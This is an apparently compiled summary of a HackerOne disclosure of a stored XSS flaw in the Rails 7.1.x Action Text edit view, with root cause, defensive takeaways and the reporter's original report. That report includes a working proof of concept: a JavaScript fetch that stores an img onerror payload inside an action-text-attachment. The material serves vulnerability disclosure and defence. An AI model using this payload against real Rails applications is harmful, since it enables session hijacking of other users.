# Action Text XSS in Rails 7.1.x Edit UI

## Metadata
- **Source:** HackerOne
- **Report:** 2389565 | https://hackerone.com/reports/2389565
- **Submitted:** 2024-02-25
- **Reporter:** ooooooo_q
- **Program:** Rails (Ruby on Rails)
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Stored XSS, DOM-based XSS
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in Rails 7.1.x Action Text editor where malicious HTML content embedded in action-text-attachment elements is executed when editing rich text fields. The vulnerability is specific to the edit view and does not manifest in the show view, affecting collaborative editing scenarios.

## Attack scenario
1. Attacker crafts a malicious action-text-attachment with HTML payload containing event handler (e.g., onerror attribute with JavaScript)
2. Attacker escapes the HTML content and embeds it in a POST request to create/update a rich text record
3. Payload is stored in the database as part of the rich_text field content
4. When authorized user opens the edit page for the affected record, the malicious attachment is rendered in the Action Text editor UI
5. The editor fails to properly sanitize the content during rendering, causing the JavaScript event handler to execute
6. Attacker gains context of the victim user's session, cookies, and can perform actions on their behalf

## Root cause
Rails 7.1.x introduced changes (PR #45739) to Action Text handling that inadvertently disabled HTML sanitization when rendering rich text attachments in the editor interface. The show view maintains proper sanitization, but the edit view directly renders untrusted content without adequate escaping of attachment metadata.

## Attacker mindset
An authenticated attacker with write permissions to rich text fields targets collaborative editing environments. They inject persistent XSS payloads that execute only when other users edit the document, enabling session hijacking, credential theft, or malicious modifications of document content in the context of victim users.

## Defensive takeaways
- Always sanitize rich text content at render time, not just storage time, especially in editable contexts
- Apply consistent HTML escaping policies across both read and edit views
- Use Content Security Policy headers to mitigate XSS impact even if escaping fails
- Validate and sanitize attachment metadata (content-type, content attributes) separately from body content
- Implement input validation to reject or strip executable attributes from attachment tags
- Test security-critical views with both intentional XSS payloads and fuzzing
- Review all changes to sanitization logic for regressions across different view contexts

## Variant hunting
Test other rich text editor views (create vs edit vs preview modes) for similar sanitization bypasses
Check if other attachment types (file, image) are vulnerable to similar payload injection
Investigate whether the vulnerability exists in different content-type values beyond text/html
Test nested attachment structures or deeply embedded payloads for filter evasion
Examine if the vulnerability affects API endpoints returning rich text with attachment data
Check Rails versions 7.1.0-7.1.x to determine exact vulnerable range

## MITRE ATT&CK
- T1190
- T1566
- T1570
- T1204

## Notes
The vulnerability is version-specific (Rails 7.1.x, not present in 7.0), indicating a regression introduced in recent changes. The discrepancy between show and edit views is critical - it suggests the vulnerability is in the editor initialization/rendering logic rather than core sanitization, possibly in Trix editor integration. The PoC is reproducible and well-documented with clear environmental setup steps.

## Full report
<details><summary>Expand</summary>

I have confirmed that XSS occurs on the Action Text edit ui.
XSS is triggered when attempting to edit the text in which the crafted values are stored.

### PoC

Prepare the environment.

```
❯ rails new -C  -G -T text
# => Rails 7.1.3.2, Ruby 3.2.3

❯ cd text

❯ bin/rails g scaffold Blog title:string body:rich_text

❯ bin/rails action_text:install

❯ bundle install

❯ bin/rails db:migrate

❯ bin/rails s
```

Open `http://localhost:3000/blogs/new`  and send the following from the developer tools

```js
function escapeHTML(str) {
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(str));
    return div.innerHTML;
}

html = "<img src=. onerror='alert(location)' />"
html_text = '<action-text-attachment content-type="text/html" content="'+ escapeHTML (html) +'"></action-text-attachment>'

csrfToken = document.querySelector("meta[name='csrf-token']").content

fetch("http://localhost:3000/blogs", {
  "headers": {
  	"content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "x-csrf-token": csrfToken,
  },
  "body": "blog%5Btitle%5D=aaa&blog%5Bbody%5D=" +encodeURIComponent(html_text)+ "&commit=Create+Blog",
  "method": "POST",
});
```

Can confirm that XSS does not fire on the `http://localhost:3000/blogs/xxx/show` page, 

{F3079164}

but XSS does occur on the `http://localhost:3000/blogs/xxx/edit` page. 

{F3079167}

## Impact

If multiple users have access to the same edit page, an XSS-based attack is possible between users.

This vulnerability is probably due to https://github.com/rails/rails/pull/45739 PR and was not reproduced in Rails 7.0.

</details>

---
*Analysed by Claude on 2026-05-12*
